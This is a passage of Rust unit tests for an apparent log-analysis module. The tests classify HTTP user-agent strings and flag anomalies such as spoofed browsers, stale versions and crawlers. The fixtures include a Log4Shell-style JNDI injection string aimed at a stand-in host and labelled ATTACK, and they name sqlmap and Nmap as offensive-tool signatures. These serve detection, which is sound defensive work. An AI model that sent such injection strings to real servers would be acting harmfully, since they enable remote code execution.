            ("Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36", NO_SUCH_PLATFORM, "NT 11"),
            ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36", STALE, "anos atrás"),
            ("Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36", NOT_CHROME, "CriOS"),
            ("Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36", FROZEN, "10_15_7"),
            ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/139.0.0.0", NOT_CHROME, "Chromium 150"),
            ("Chrome/150.0.0.0 Safari/537.36", NOT_BROWSER_FORMAT, "Mozilla/5.0"),
            ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/150.0.0.0", NOT_CHROME, "AppleWebKit/537.36"),
            ("Mozilla/5.0 ${jndi:ldap://x.example/a}", ATTACK, "payload"),
            ("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", DISCONTINUED, "Internet Explorer"),
            ("Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", DISCONTINUED, "Android"),
            ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Chrome/150.0.0.0 Mobile Safari/537.36", REPEATED, "Chrome/"),
        ] {
            let p = profile(ua, today);
            assert!(p.anomalies.iter().any(|a| a.label == label && a.detail.contains(detail)), "{ua}: {:?}", p.anomalies);
        }
        // A version from the future of its own event is impossible, even if it exists today.
        let chrome_130 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36";
        assert!(profile(chrome_130, at(2023, 1, 10)).anomalies.iter().any(|a| a.label == FUTURE));
        assert!(profile(chrome_130, today).anomalies.is_empty());
    }

    #[test]
    fn clients_that_are_not_browsers_are_named() {
        let today = at(2026, 10, 12);
        for (ua, class, family) in [
            ("curl/8.4.0", LIBRARY, "curl"),
            ("python-requests/2.31.0", LIBRARY, "python-requests"),
            ("Python/3.12 aiohttp/3.9.1", LIBRARY, "aiohttp"),
            ("Go-http-client/1.1", LIBRARY, "Go net/http"),
            ("Wget/1.21.4", LIBRARY, "Wget"),
            ("Apache CXF 2.7.18.SP6-redhat-1", LIBRARY, "Apache CXF"),
            ("Mozilla/5.0 (Windows NT; Windows NT 10.0; pt-BR) WindowsPowerShell/5.1.19041.3031", LIBRARY, "PowerShell"),
            ("sqlmap/1.7.2#stable (https://sqlmap.org)", OFFENSIVE, "sqlmap"),
            ("Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", OFFENSIVE, "Nmap"),
            ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.0.0 Safari/537.36", AUTOMATION, "Chrome sem interface (headless)"),
            ("Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.4; +https://openai.com/gptbot)", CRAWLER, "GPTBot"),
            ("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", CRAWLER, "Googlebot"),
            ("Zabbix", MONITOR, "Zabbix"),
            ("kube-probe/1.30", MONITOR, "Kubernetes probe"),
            ("Dalvik/2.1.0 (Linux; U; Android 14; SM-S918B Build/UP1A.231005.007)", APP, "Android (Dalvik)"),
            ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Slack/4.41.105 Chrome/130.0.6723.191 Electron/33.2.1 Safari/537.36", APP, "Electron"),
            ("-", EMPTY, "sem user agent"),
            ("x8Kq2LmZ9pWvT4rY", UNKNOWN, "x8Kq2LmZ9pWvT4rY"),
            ("MinhaIntegracao/2.0", UNKNOWN, "MinhaIntegracao"),
        ] {
            let p = profile(ua, today);
            assert_eq!((p.class, p.family.as_str()), (class, family), "{ua}");
        }
        assert!(profile("x8Kq2LmZ9pWvT4rY", today).anomalies.iter().any(|a| a.label == RANDOM));
        assert!(profile("MinhaIntegracao/2.0", today).anomalies.is_empty());
        assert!(CLASSES.contains(&BROWSER) && CLASSES.len() == 9);
    }

    #[test]
    fn version_timelines_follow_release_cadence() {
        let day = |y, m, d| NaiveDate::from_ymd_opt(y, m, d).unwrap();
        assert!((CHROME.newest(day(2023, 12, 5)) - 120).abs() <= 1);
        assert!((CHROME.newest(day(2020, 1, 1)) - 79).abs() <= 2);
        assert!((CHROME.newest(day(2025, 3, 4)) - 134).abs() <= 2);
        assert!((FIREFOX.newest(day(2022, 5, 3)) - 100).abs() <= 1);
        assert!((FIREFOX.newest(day(2024, 9, 3)) - 130).abs() <= 2);
        assert_eq!(newest_safari(day(2026, 10, 1)), 27);
        assert_eq!(newest_safari(day(2025, 8, 1)), 18);
    }

    #[test]
    fn events_get_the_profile_as_fields() {
        let mut ev = crate::model::Event::empty();
        ev.timestamp = at(2026, 10, 12);
        ev.fields.insert("agent".into(), Value::from("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/150.0"));
        annotate(&mut ev);
        assert_eq!(ev.fields["ua.class"], BROWSER);
        assert_eq!(ev.fields["ua.family"], "Firefox");
        assert_eq!(ev.fields["ua.version"], "150");
        assert_eq!(ev.fields["ua.os"], "Windows");
        assert_eq!(ev.fields["ua.anomaly"], NOT_FIREFOX);
        assert!(ev.fields["ua.anomaly_detail"].as_str().unwrap().contains("rv:140"));
        let mut iis = crate::model::Event::empty();
        iis.fields.insert("cs(User-Agent)".into(), Value::from("Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html)"));
        annotate(&mut iis);
        assert_eq!(iis.fields["ua.family"], "Googlebot");
        let mut none = crate::model::Event::empty();
        annotate(&mut none);
        assert!(none.fields.is_empty());
    }
}
